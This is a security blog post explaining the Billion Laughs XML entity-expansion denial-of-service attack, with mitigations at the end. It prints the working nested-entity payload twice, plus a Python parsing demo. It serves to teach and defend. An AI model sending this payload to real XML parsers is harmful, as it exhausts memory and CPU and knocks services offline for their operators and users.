---
title:  "XML Security: A Billion Laughs"
date:   2016-01-26 02:22:02 +0900
description: XML Security
tags: [security]
---


# What ?
The Billion Laughs attack is a denial-of-service attack that targets XML parsers in many programming language libraries such as: SAX, Etree, DOM.  It can occur even when using well-formed XML and can also pass XML schema validation.

# Why should we care about it ?
An attacker submits an XML document to a target application where the XML document uses nested entity expansion to produce an excessively large output XML. XML allows the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.

# How
### Background
In order to understand how Billion laughs attack works, we need to have background in XML entity and some definitions of XML document:

* DTDs (Document Type Definition) are meant to define the expected structure of an XML document. It is a set of markup declarations that defines a document type for an SGML-family markup languages (SGML, XML, HTML).
* XML stands for EXtensible Markup Language.
* XML was designed to store and transport data.
* XML was designed to be both human and machine-readable.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<animal>
  <name>cat</name>
  <action>meoooo</action>
</animal>
```

XML Entities:

* Entities are used to define shortcuts to special characters.
* Entities can be declared internal or external.
* Entities that are not predefined can be declared internal or external.
    * Internally declared - the entity is defined within the same document.
    * Externally declared - the entity is defined in an external document. Only the reference to the external document is given.

The following code will explain what XML entity is:

```xml
<!ENTITY writer "Donald Duck.">
<!ENTITY copyright "Copyright W3Schools.">
<author>&writer;&copyright;</author>
```

When we use `&writer;` it will symbolic present to writer attribute and get value "Donal Duck". Similar to that thing, `&copyright;` will symboic present to copyright and get value "Copyright W3Schools".

## Exploit
The vanilla Billion Laughs attack is illustrated as XML code follow:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

In this example, there are 10 different XML entities, lol – lol9. The first entity, lol is defined to be the string “lol”.  However, each of the other entities are defined to be 10 of another entity.  The document content section of this XML file contains a reference to only one instance of the entity lol9.  However, when this is being parsed by a DOM or SAX parser, when lol9 is encountered, it is expanded into 10 lol8’s, each of which is expanded into 10 lol7’s, and so on and so forth.  By the time everything is expanded to the text lol, there are 100,000,000 instances of the string lol.  If there was one more entity, or lol was defined as 10 strings of “lol”, there would be a Billion “lol”s, hence the name of the attack.  Needless to say, these expansions consumes an exponential amount of resources and time, causing the DOS.

# Demo
XML file name `lol.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Python code:

```python
import xml.etree.ElementTree as ET
tree = ET.parse('lol.xml')
root = tree.getroot()
```

Execute it.

# Mitigating
Because the behavior of each XML parser may be different based on implementation, there is no one way to prevent Billion Laughs attacks.  However, there are a few main techniques used to prevent this denial-of-service attack.

* Turn off entity expansion.
* Limit the number of Entity Reference Nodes so that the parser can expand.
* Limit the number of characters entities can expand to.
